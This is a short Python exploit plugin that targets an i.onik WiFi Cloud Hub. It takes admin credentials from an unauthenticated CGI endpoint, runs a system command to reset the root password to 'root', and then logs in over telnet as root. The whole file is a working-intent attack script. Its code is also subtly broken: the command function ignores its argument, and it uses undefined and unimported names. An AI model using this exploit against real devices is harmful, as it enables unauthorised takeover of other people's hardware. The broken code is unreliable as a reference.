Description = 'Root exploit i.onik WIFI Cloud Hub'
from plugin_support import *

import sys
import requests
import re
from telnetlib import Telnet
from requests.auth import HTTPBasicAuth

before_execute()
try:
	HOST = ask.target
	xml = requests.get("http://%s/cgi-bin/WiFiDriveCtrl.cgi?TrendTecWiFi&cmd_get_net_info" % (HOST))
	parsed = re.search(r'<UserName>(.*)</UserName><Password>(.*)</Password>', xml)
	username = parsed.group(1)
	password = parsed.group(2)
	logins = "Got credentials %s:%s" % (username,password)
	success(logins)
except Exception:
	fail("Unable to find credentials")
	exit()

def eval(cmd):
	requests.post("http://" + HOST + ":8000/goform/SystemCommand", data={'command': 'ls'}, auth=HTTPBasicAuth(username, password)).text
	parsed = html.split('<textarea cols="63" rows="20" wrap="off" readonly="1">')

text("Changing root password to 'root'")
eval('/sbin/chpasswd.sh root root')

try:
	warning("Connecting to root session")
	tn = telnetlib.Telnet(HOST, 23)
	tn.read_until("login: ")
	tn.write("root\n")
	tn.read_until("Password: ")
	tn.write("root\n")
	tn.interact()
except Exception:
	fail("Couldnt connect to telnet session")
	exit()
